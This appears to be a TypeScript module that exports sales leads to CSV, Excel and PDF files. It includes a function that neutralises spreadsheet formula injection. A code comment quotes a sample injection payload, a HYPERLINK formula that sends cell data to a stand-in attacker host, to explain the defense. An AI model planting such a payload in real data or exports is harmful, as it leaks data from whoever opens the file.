import { displayWebsite, formatCallbackDate } from "./leadUtils";
import { CALL_STATUS_LABELS, LEAD_SOURCE_LABELS, type Lead } from "./types";

/**
 * Lead → file. One row-shaping definition feeds all three formats, so a CSV,
 * a spreadsheet and a printout never disagree about what a lead contains.
 *
 * The heavy writers (`xlsx`, `jspdf`) are imported dynamically inside their
 * own functions: an agent who never exports should not pay ~600KB of parser
 * on first paint.
 */

export const EXPORT_FORMATS = ["csv", "xlsx", "pdf"] as const;
export type ExportFormat = (typeof EXPORT_FORMATS)[number];

export const EXPORT_FORMAT_LABELS: Record<ExportFormat, string> = {
  csv: "CSV",
  xlsx: "Excel (XLSX)",
  pdf: "PDF",
};

export const EXPORT_FORMAT_HINTS: Record<ExportFormat, string> = {
  csv: "Plain text, opens anywhere. Best for re-importing or piping onward.",
  xlsx: "One sheet, sized columns, header filter dropdowns.",
  pdf: "Landscape call sheet, laid out to print and mark up by hand.",
};

/**
 * What a given run covered. It is derived from what the agent actually did —
 * ticked rows, or filtered, or neither — rather than chosen from a menu, and
 * feeds the filename and the PDF's subtitle.
 */
export const EXPORT_SCOPES = ["selected", "filtered", "all"] as const;
export type ExportScope = (typeof EXPORT_SCOPES)[number];

export const EXPORT_SCOPE_LABELS: Record<ExportScope, string> = {
  selected: "Ticked rows",
  filtered: "Filtered list",
  all: "All leads",
};

/** Column order for the data formats. `width` is the XLSX column width. */
const COLUMNS: Array<{ header: string; width: number; value: (lead: Lead) => string }> =
  [
    { header: "Name", width: 28, value: (lead) => lead.name },
    { header: "Phone", width: 16, value: (lead) => lead.phone ?? "" },
    { header: "Address", width: 34, value: (lead) => lead.address },
    { header: "Category", width: 24, value: (lead) => lead.categories.join(", ") },
    { header: "Website", width: 26, value: (lead) => lead.website ?? "" },
    {
      header: "Rating",
      width: 8,
      value: (lead) => (lead.rating === null ? "" : lead.rating.toFixed(1)),
    },
    { header: "Owner", width: 20, value: (lead) => lead.owner ?? "" },
    {
      header: "Source",
      width: 12,
      value: (lead) => LEAD_SOURCE_LABELS[lead.source],
    },
    { header: "Status", width: 20, value: (lead) => CALL_STATUS_LABELS[lead.status] },
    { header: "Callback date", width: 14, value: (lead) => lead.callbackDate ?? "" },
    { header: "Notes", width: 46, value: (lead) => lead.notes },
    // Was "Yelp URL". Renamed once Google Maps rows started arriving in the
    // same table: the column holds whichever listing the row came from, and
    // the Source column beside it says which that is.
    { header: "Listing URL", width: 40, value: (lead) => lead.url ?? "" },
  ];

/**
 * A printed call sheet is a different document from a spreadsheet: it drops
 * the columns an agent cannot use with a pen (URLs, ratings) and shortens the
 * rest so a landscape page stays readable.
 */
const PRINT_COLUMNS: Array<{
  header: string;
  width: number;
  value: (lead: Lead, today: string) => string;
}> = [
  { header: "Business", width: 46, value: (lead) => lead.name },
  { header: "Phone", width: 30, value: (lead) => lead.phone ?? "" },
  { header: "Address", width: 62, value: (lead) => lead.address },
  {
    header: "Category",
    width: 38,
    value: (lead) => lead.categories.slice(0, 2).join(", "),
  },
  { header: "Website", width: 40, value: (lead) => (lead.website ? displayWebsite(lead.website) : "") },
  { header: "Status", width: 30, value: (lead) => CALL_STATUS_LABELS[lead.status] },
  {
    header: "Callback",
    width: 22,
    value: (lead, today) =>
      lead.callbackDate ? formatCallbackDate(lead.callbackDate, today) : "",
  },
  { header: "Notes", width: 0, value: (lead) => lead.notes },
];

export const EXPORT_COLUMN_HEADERS = COLUMNS.map((column) => column.header);

/* ========================================================================== *
 * Spreadsheet formula injection
 * ========================================================================== */

/**
 * The characters that make a spreadsheet treat a cell as code rather than text.
 *
 * `=` is the obvious one; `+`, `-` and `@` all begin a formula in Excel, and a
 * leading TAB or CR is stripped on the way in, which puts whichever of the
 * first four follows it back at the start of the cell.
 */
const FORMULA_TRIGGERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * A cell value that a spreadsheet cannot mistake for a formula.
 *
 * ---------------------------------------------------------------------------
 * The exposure this closes
 * ---------------------------------------------------------------------------
 * Almost everything in a lead row is text somebody else wrote: the business
 * name and address come from the scraper, and `notes` is free text typed into
 * the portal. A lead called `=HYPERLINK("https://evil.example/"&A2,"Click")`
 * exports as a live formula, and the person it runs on is an administrator
 * opening the export on their own machine — the classic CSV injection, where
 * the vulnerable application is the spreadsheet and the file is the payload.
 * Excel's macro and DDE prompts are the last line of defence, and they are a
 * dialog box a busy person clicks through.
 *
 * ---------------------------------------------------------------------------
 * The fix, and where it is *not*
 * ---------------------------------------------------------------------------
 * A leading apostrophe, which every spreadsheet reads as "the rest of this cell
 * is text". It is applied here, at the point rows are shaped for a file, and
 * nowhere near the database: the stored lead is not modified, the worklist and
 * the lead page still render exactly what was scraped or typed, and re-importing
 * an export is unaffected (`parseLeadsCsv` reads the apostrophe as part of a
 * name, which is a cosmetic difference in a file nobody re-imports, not a lost
 * row).
 *
 * Values that do not begin with a trigger are returned byte-for-byte — `John
 * Smith` and `123 Main Street` come out as themselves.
 *
 * A negative number *is* rewritten (`-10` becomes `'-10`), and that is the
 * rule working rather than misfiring. There is no column here where a lead
 * legitimately carries a leading `-` or `+`: ratings are 0–5, the only numeric
 * column, and phone numbers in this database are `(415) 555-0182`. Special-casing
 * "looks like a number" would mean deciding on every export whether
 * `+1-415-555-0182` is a phone number or the subtraction Excel will evaluate it
 * as, and getting that judgement wrong once is the whole vulnerability back.
 */
export function neutraliseFormula(value: string): string {
  if (value === "") return value;
  return FORMULA_TRIGGERS.has(value.charAt(0)) ? `'${value}` : value;
}

/**
 * Rows as plain objects, in column order — what CSV and XLSX both consume.
 *
 * Every cell goes through {@link neutraliseFormula} here, in the one shared
 * shaping step, so the two data formats cannot disagree about it and a column
 * added to `COLUMNS` later is covered without anyone remembering to cover it.
 * The headers are this file's own constants and are not passed through: they
 * are not attacker-controlled, and quoting them would put an apostrophe in
 * front of every column title.
 *
 * The PDF does not come through here. It has its own `PRINT_COLUMNS` and draws
 * text onto a page — there is no cell for a formula to live in, and nothing
 * about that output changes.
 */
export function toExportRows(leads: Lead[]): Array<Record<string, string>> {
  return leads.map((lead) => {
    const row: Record<string, string> = {};
    for (const column of COLUMNS) row[column.header] = neutraliseFormula(column.value(lead));
    return row;
  });
}

/** `leads-selected-2026-08-05.csv` */
export function exportFilename(
  scope: ExportScope,
  format: ExportFormat,
  today: string,
): string {
  return `leads-${scope}-${today}.${format}`;
}

function download(blob: Blob, filename: string): void {
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  document.body.append(link);
  link.click();
  link.remove();
  // Revoking immediately can cancel the download in some browsers.
  setTimeout(() => URL.revokeObjectURL(url), 10_000);
}

async function exportCsv(leads: Lead[], filename: string): Promise<void> {
  const Papa = (await import("papaparse")).default;
  const csv = Papa.unparse(toExportRows(leads), {
    columns: EXPORT_COLUMN_HEADERS,
  });
  // The BOM makes Excel open UTF-8 accents correctly on Windows.
  download(new Blob([`﻿${csv}`], { type: "text/csv;charset=utf-8" }), filename);
}

async function exportXlsx(leads: Lead[], filename: string): Promise<void> {
  const XLSX = await import("xlsx");
  const sheet = XLSX.utils.json_to_sheet(toExportRows(leads), {
    header: EXPORT_COLUMN_HEADERS,
  });
  sheet["!cols"] = COLUMNS.map((column) => ({ wch: column.width }));
  // Header dropdowns, so the sheet is sortable/filterable on open. Freeze
  // panes are deliberately not attempted: SheetJS's community build silently
  // drops `!freeze` (no `<pane>` is written), so claiming it would be a lie.
  sheet["!autofilter"] = {
    ref: XLSX.utils.encode_range({
      s: { r: 0, c: 0 },
      e: { r: leads.length, c: COLUMNS.length - 1 },
    }),
  };

  const book = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(book, sheet, "Leads");
  const data = XLSX.write(book, { bookType: "xlsx", type: "array" }) as ArrayBuffer;

  download(
    new Blob([data], {
      type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    }),
    filename,
  );
}

async function exportPdf(
  leads: Lead[],
  filename: string,
  today: string,
  scopeLabel: string,
): Promise<void> {
  const { jsPDF } = await import("jspdf");
  const autoTable = (await import("jspdf-autotable")).default;

  const doc = new jsPDF({ orientation: "landscape", unit: "pt", format: "a4" });

  doc.setFont("helvetica", "bold");
  doc.setFontSize(14);
  // ASCII only in chrome text: jsPDF's core fonts are WinAnsi, and an em dash
  // silently renders as a blank rather than failing loudly.
  doc.text("Lead Portal - call sheet", 40, 38);

  doc.setFont("helvetica", "normal");
  doc.setFontSize(9);
  doc.setTextColor(110);
  doc.text(`${scopeLabel} · ${leads.length} leads · ${today}`, 40, 52);

  autoTable(doc, {
    startY: 66,
    head: [PRINT_COLUMNS.map((column) => column.header)],
    body: leads.map((lead) =>
      PRINT_COLUMNS.map((column) => column.value(lead, today)),
    ),
    styles: {
      font: "helvetica",
      fontSize: 8,
      cellPadding: 4,
      overflow: "linebreak",
      textColor: 30,
      lineColor: 210,
      lineWidth: 0.5,
    },
    headStyles: {
      fillColor: [229, 72, 77], // the app's signal red
      textColor: 255,
      fontStyle: "bold",
      fontSize: 8,
    },
    alternateRowStyles: { fillColor: [248, 248, 250] },
    columnStyles: Object.fromEntries(
      PRINT_COLUMNS.map((column, index) => [
        index,
        column.width > 0
          ? { cellWidth: column.width * 2 }
          : { cellWidth: "auto" as const },
      ]),
    ),
  });

  /*
   * Footers are stamped after the table is laid out, not from `didDrawPage`.
   * That hook fires once per table chunk rather than once per page, and
   * `getNumberOfPages()` inside it returns the running total — together they
   * produced "Page 1, Page 2, Page 2" on a two-page sheet.
   */
  const pageCount = doc.getNumberOfPages();
  for (let page = 1; page <= pageCount; page += 1) {
    doc.setPage(page);
    doc.setFont("helvetica", "normal");
    doc.setFontSize(8);
    doc.setTextColor(140);
    doc.text(
      `Page ${page} of ${pageCount}`,
      40,
      doc.internal.pageSize.getHeight() - 18,
    );
  }

  download(doc.output("blob"), filename);
}

export interface ExportRequest {
  leads: Lead[];
  format: ExportFormat;
  scope: ExportScope;
  today: string;
}

/** Runs the export and resolves with the filename that was downloaded. */
export async function runExport({
  leads,
  format,
  scope,
  today,
}: ExportRequest): Promise<string> {
  if (leads.length === 0) {
    throw new Error("There are no leads in that selection to export.");
  }

  const filename = exportFilename(scope, format, today);

  if (format === "csv") await exportCsv(leads, filename);
  else if (format === "xlsx") await exportXlsx(leads, filename);
  else await exportPdf(leads, filename, today, EXPORT_SCOPE_LABELS[scope]);

  return filename;
}
